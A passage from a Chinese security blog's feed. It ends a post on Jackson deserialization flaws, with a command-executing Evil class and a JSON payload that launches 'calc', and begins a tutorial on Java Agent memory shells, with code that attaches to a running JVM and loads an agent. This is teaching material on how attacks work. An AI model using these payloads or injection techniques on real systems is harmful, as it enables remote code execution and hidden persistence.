class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationRun</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.JacksonVul.EvilSex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性为-Object-类时"><a href="#属性为-Object-类时" class="headerlink" title="属性为 Object 类时"></a>属性为 Object 类时</h4><p><strong>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</strong></p><p>后面出现的 Jackson 反序列化的 CVE 漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链。</p><p>我们编写一个存在漏洞的代码</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    String cmd;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Person4.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span></span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)    public Object object;  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person4</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 setter 函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写反序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationObjectRun</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;object\&quot;:[\&quot;com.drunkbaby.JacksonVul.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person4</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person4.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/calc2.png" class><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>概念虽然多，但是自己跟一下代码，看起来还是非常快的。总而言之就是开启了特殊的反序列化解析方式时，会调用任意的构造函数与 setter 方法</p><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Jackson 反序列化漏洞原理</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent 内存马学习</title>
    <link href="https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-12-07T12:05:37.000Z</published>
    <updated>2023-12-07T12:41:10.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-Java-Agent？"><a href="#什么是-Java-Agent？" class="headerlink" title="什么是 Java Agent？"></a>什么是 Java Agent？</h2><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于 Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的<code>premain-Agent</code>，另一种是 JVM 启动之后加载的 <code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的 Interceptor（拦截器），如下图。</p><p><strong>Premain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/PreAgent.png" class><p><strong>agentmain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmain-Agent.png" class><h2 id="几种-Java-Agent-实例"><a href="#几种-Java-Agent-实例" class="headerlink" title="几种 Java Agent 实例"></a>几种 Java Agent 实例</h2><h3 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h3><p>从官方文档中可知晓，首先我们必须实现 premain 方法，同时我们 jar 文件的清单（mainfest）中必须要含有 Premain-Class 属性</p><p>我们可在命令行利用 <strong>-javaagent</strong> 来实现启动时加载。</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/premain.png" class><p>premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法</p><p>我们首先来实现一个简单的 <code>premain-Agent</code>，创建一个 Maven 项目，编写一个简单的 <code>premain-Agent</code>，创建的类需要实现 premain 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在 <code>resource/META-INF/</code> 下创建 <code>agent.MF</code> 清单文件用以指定 <code>premain-Agent</code> 的启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br></pre></td></tr></table></figure><p>接着用 jar 命令来打包，此时并指定启动项。运行完命令之后将会生成 agent.jar 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class</span><br></pre></td></tr></table></figure><p>接着创建一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，创建对应的 mf 启动项，取名为 <code>hello.mf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Main-Class: Hello</span><br></pre></td></tr></table></figure><p>同样的打包方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar META-INF/maven/hello.mf Hello.class</span><br></pre></td></tr></table></figure><p>至此我们的准备工作已经做完了，最终得到了 agent.jar 和 hello.jar</p><p>接下来我们只需要在 <code>java -jar</code> 中添加 <code>-javaagent:agent.jar</code> 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar=Hello -jar hello.jar</span><br></pre></td></tr></table></figure><p>可以看到我们 agent 中 premain 的代码被优先执行了</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentSuccess.png" class><ul><li>以上就是 Premain-Agent 的工作实例</li></ul><h3 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h3><p>相较于 premain-Agent 只能在 JVM 启动前加载，agentmain-Agent 能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和 JVM 有关的两个类。</p><h4 id="VirtualMachine类"><a href="#VirtualMachine类" class="headerlink" title="VirtualMachine类"></a>VirtualMachine类</h4><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给 attach 方法传入一个 JVM 的 PID，来远程连接到该 JVM 上 ，之后我们就可以对连接的 JVM 进行各种操作，如注入 Agent。下面是该类的主要方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h4 id="VirtualMachineDescriptor-类"><a href="#VirtualMachineDescriptor-类" class="headerlink" title="VirtualMachineDescriptor 类"></a>VirtualMachineDescriptor 类</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.get_PID&quot;</span>))  </span><br><span class="line">                System.out.println(vmd.id());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/JVMAttach.png" class><p>下面我们就来实现一个<code>agentmain-Agent</code>。首先我们编写一个 <code>Sleep_Hello</code> 类，模拟正在运行的 JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">5000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写我们的 agentmain-Agent 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时配置 agentmain.mf 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.drunkbaby.Java_Agent_agentmain</span><br></pre></td></tr></table></figure><p>接着，编译打包成 jar 文件</p><p>打包成 jar 包的方式建议是在 pom.xml 当中添加以下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">            src/main/resources/META-INF/MAINFEST.MF  </span><br><span class="line">          <span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着用 <code>mvn:assembly</code> 命令打包成 jar 包即可</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmainBuild.png" class><p>获取2个 jar 包，我们需要的是第二个，随后我们设置 <strong>VM-OPTIONS</strong> (最大的坑），这个 vm-options 在新版 UI 里默认是隐藏了起来的，所以你要把他打开，否则你很容易把它和变量列表搞混：</p><p>最后准备一个 Inject 类，将我们的 agent-main 注入目标 JVM：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Agentmain\\target\\agentdemo-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行目标 JVM，再运行 inject 类进行注入，最后结果如下，一开始是只输出 hello, world 的，运行 inject 之后就插入了 agent-main 方法：</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/successAgentMainInject.png" class><h3 id="动态修改字节码-Instrumentation"><a href="#动态修改字节码-Instrumentation" class="headerlink" title="动态修改字节码 Instrumentation"></a>动态修改字节码 Instrumentation</h3><p>在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，那么 Instrumentation 实例是什么，在聊这个之前要先简单了解一下 Javassist</p><h4 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h4><h5 id="什么是-Javassist"><a href="#什么是-Javassist" class="headerlink" title="什么是 Javassist"></a>什么是 Javassist</h5><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p><h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 